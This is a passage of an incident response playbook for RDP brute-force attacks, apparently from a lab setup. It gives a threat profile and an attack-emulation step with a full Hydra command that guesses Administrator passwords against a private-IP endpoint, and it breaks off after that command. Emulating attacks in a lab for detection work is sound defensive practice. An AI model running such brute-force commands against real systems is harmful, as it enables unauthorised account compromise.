# Incident Response Playbook: RDP Brute-Force Attack

## 1. Threat Profile
- **Attack Type:** RDP Credential Spraying / Brute-Force
- **MITRE ATT&CK Technique:** T1110.001 (Brute Force: Password Guessing)
- **Severity Level:** High (Wazuh Rule Level 10)
- **Target Node:** `Endpoint-01` (`192.168.10.10`)

---

## 2. Attack Emulation (Kali Linux)
High-frequency automated login attempt via Hydra over RDP port 3389:
```bash
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.10.10 -t 4
